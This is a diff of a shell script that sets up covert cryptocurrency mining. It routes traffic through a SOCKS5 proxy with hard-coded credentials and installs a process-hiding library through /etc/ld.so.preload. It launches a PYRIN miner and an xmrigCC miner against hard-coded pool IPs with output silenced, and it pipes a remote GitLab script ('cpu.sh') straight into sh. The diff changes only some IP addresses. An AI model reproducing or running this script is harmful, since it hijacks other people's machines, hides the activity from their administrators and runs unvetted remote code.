@@ -26,7 +26,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 142.93.74.31:443
+socks5 = 142.93.74.3:443
 socks5_username = majapahlevi
 socks5_password = majapahlevi
 END
@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 -a PYRIN -p 167.172.24.221:80 -u pyrin:qq793yqj26gca8n2lj7ff7w80rylvuxp02qy0vaqw0sx5u9hq9hjs0c8kdrj4.$(shuf -n 1 -i 1-3000)-Bismillah --no-cl & wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvs7jNwGb9bK2u6V63LRJZHAPh4HWMEasmH4tN13pbGMfoNfFB4f9c8K3q2p5EQXREcUJ4T6yL3YhgAE4dav5Fd3CAznd8eBx -p WK01 -k -a randomx -t2 > /dev/null 2>&1 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.81 -a PYRIN -p 167.172.24.22:80 -u pyrin:qq793yqj26gca8n2lj7ff7w80rylvuxp02qy0vaqw0sx5u9hq9hjs0c8kdrj4.$(shuf -n 1 -i 1-3000)-Bismillah --no-cl & wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvs7jNwGb9bK2u6V63LRJZHAPh4HWMEasmH4tN13pbGMfoNfFB4f9c8K3q2p5EQXREcUJ4T6yL3YhgAE4dav5Fd3CAznd8eBx -p WK01 -k -a randomx -t2 > /dev/null 2>&1 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
